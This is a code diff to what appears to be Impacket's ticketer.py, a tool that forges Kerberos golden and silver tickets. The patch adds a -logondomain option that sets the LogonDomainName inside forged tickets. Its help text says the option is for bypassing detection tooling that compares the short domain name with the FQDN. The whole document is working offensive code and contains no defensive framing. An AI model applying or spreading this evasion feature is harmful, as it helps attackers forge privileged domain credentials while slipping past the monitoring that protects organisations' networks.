@@ -90,12 +90,17 @@ class TICKETER:
             self.__server = spn[1]
             if options.keytab is not None:
                 self.loadKeysFromKeytab(options.keytab)
-
+            
         # we are creating a golden ticket
         else:
             self.__service = 'krbtgt'
             self.__server = self.__domain
 
+        if options.logondomain is not None:
+            self.__logondomain = options.logondomain
+        else:
+            self.__logondomain = self.__domain
+            
     @staticmethod
     def getFileTime(t):
         t *= 10000000
@@ -181,7 +186,7 @@ class TICKETER:
         kerbdata['UserFlags'] = 0
         kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
         kerbdata['LogonServer'] = ''
-        kerbdata['LogonDomainName'] = self.__domain.upper()
+        kerbdata['LogonDomainName'] = self.__logondomain.upper()
         kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)
         kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
         kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
@@ -429,7 +434,7 @@ class TICKETER:
             kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32
 
             # Let's adjust username and other data
-            validationInfo['Data']['LogonDomainName'] = self.__domain.upper()
+            validationInfo['Data']['LogonDomainName'] = self.__logondomain.upper()
             validationInfo['Data']['EffectiveName'] = self.__target
             # Our Golden Well-known groups! :)
             groups = self.__options.groups.split(',')
@@ -736,6 +741,10 @@ if __name__ == '__main__':
     parser.add_argument('-domain', action='store', required=True, help='the fully qualified domain name (e.g. contoso.com)')
     parser.add_argument('-domain-sid', action='store', required=True, help='Domain SID of the target domain the ticker will be '
                                                             'generated for')
+    parser.add_argument('-logondomain', action='store', help='LogonDomainName attribute inside the ticket '
+                                                             '(default: use FQDN specified in the domain option, '
+                                                             'useful for bypassing tooling detecions like checking '
+                                                             'short domain name vs FQDN inside LogonDomainName)')
     parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key used for signing the ticket '
                                                                              '(128 or 256 bits)')
     parser.add_argument('-nthash', action="store", help='NT hash used for signing the ticket')
